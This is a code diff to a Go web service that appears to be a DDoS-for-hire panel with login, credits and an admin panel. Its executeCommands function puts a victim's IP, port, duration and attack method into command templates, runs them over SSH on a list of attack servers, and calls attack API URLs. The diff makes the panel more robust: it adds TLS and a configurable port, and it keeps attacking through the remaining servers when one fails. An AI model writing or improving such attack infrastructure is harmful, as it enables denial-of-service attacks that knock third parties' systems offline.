@@ -53,6 +53,9 @@ type Config struct {
 	TelegramBotToken     string          `json:"telegramBotToken"`
 	TelegramChatID       int64           `json:"telegramChatID"`
 	Blacklist            BlacklistConfig `json:"blacklist"`
+	ListenPort           int             `json:"listenPort"`
+	SSLCertPath          string          `json:"sslCertPath"`
+	SSLKeyPath           string          `json:"sslKeyPath"`
 }
 
 type BlacklistConfig struct {
@@ -203,7 +206,16 @@ func main() {
 	http.HandleFunc("/credits", handleCredits)
 	http.HandleFunc("/panel", handlePanel)
 	http.HandleFunc("/login", handleLogin)
-	log.Fatal(http.ListenAndServe(":80", nil))
+
+	port := cfg.ListenPort
+	if port == 0 {
+		port = 80
+	}
+	addr := fmt.Sprintf(":%d", port)
+	if cfg.SSLCertPath != "" && cfg.SSLKeyPath != "" {
+		log.Fatal(http.ListenAndServeTLS(addr, cfg.SSLCertPath, cfg.SSLKeyPath, nil))
+	}
+	log.Fatal(http.ListenAndServe(addr, nil))
 }
 
 func handleLogin(w http.ResponseWriter, r *http.Request) {
@@ -621,15 +633,22 @@ func executeCommands(target string, port, duration int, method string, logID int
 		return fmt.Errorf("method not found")
 	}
 
-	cmd := strings.ReplaceAll(cmdTemplate, "{IP}", target)
-	cmd = strings.ReplaceAll(cmd, "{PORT}", strconv.Itoa(port))
-	cmd = strings.ReplaceAll(cmd, "{DURATION}", strconv.Itoa(duration))
 	methodUpper := strings.ToUpper(method)
+	replacer := strings.NewReplacer(
+		"{IP}", target,
+		"{ip}", target,
+		"{PORT}", strconv.Itoa(port),
+		"{port}", strconv.Itoa(port),
+		"{DURATION}", strconv.Itoa(duration),
+		"{duration}", strconv.Itoa(duration),
+		"{METHOD}", methodUpper,
+		"{method}", methodUpper,
+	)
+	cmd := replacer.Replace(cmdTemplate)
 
 	for _, serverCfg := range cfg.Servers {
 		server := serverCfg.Config
 
-		// Construct the SSH command and arguments separately
 		sshArgs := []string{
 			"sshpass", "-p", server.Password,
 			"ssh",
@@ -638,28 +657,25 @@ func executeCommands(target string, port, duration int, method string, logID int
 			fmt.Sprintf("%s@%s", server.Username, server.Host),
 			cmd,
 		}
-		// Bad idea this will print as many times as servers you got i gotta fix this someday, not important you got the db and the telegram log bot
 
-		//fmt.Printf("Attack Sent: Target: %s Port: %d Duration: %d Method: %s\n", target, port, duration, method)
-		// Execute the command
 		execCmd := exec.Command(sshArgs[0], sshArgs[1:]...)
 		output, err := execCmd.CombinedOutput()
 		if err != nil {
-			return fmt.Errorf("failed to execute command on server %s: %w. Output: %s", server.Host, err, string(output))
+			log.Printf("failed to execute command on server %s: %v. Output: %s", server.Host, err, string(output))
+			continue
 		}
 	}
 
 	for _, apiT := range apiTemplates {
-		apiURL := strings.ReplaceAll(apiT, "{IP}", target)
-		apiURL = strings.ReplaceAll(apiURL, "{PORT}", strconv.Itoa(port))
-		apiURL = strings.ReplaceAll(apiURL, "{DURATION}", strconv.Itoa(duration))
-		apiURL = strings.ReplaceAll(apiURL, "{METHOD}", methodUpper)
+		apiURL := replacer.Replace(apiT)
 		resp, err := http.Get(apiURL)
 		if err != nil {
-			return fmt.Errorf("failed to call api %s: %w", apiURL, err)
+			log.Printf("failed to call api %s: %v", apiURL, err)
+			continue
 		}
 		io.Copy(io.Discard, resp.Body)
 		resp.Body.Close()
+		fmt.Println(resp.StatusCode)
 	}
 
 	time.Sleep(time.Duration(duration) * time.Second)
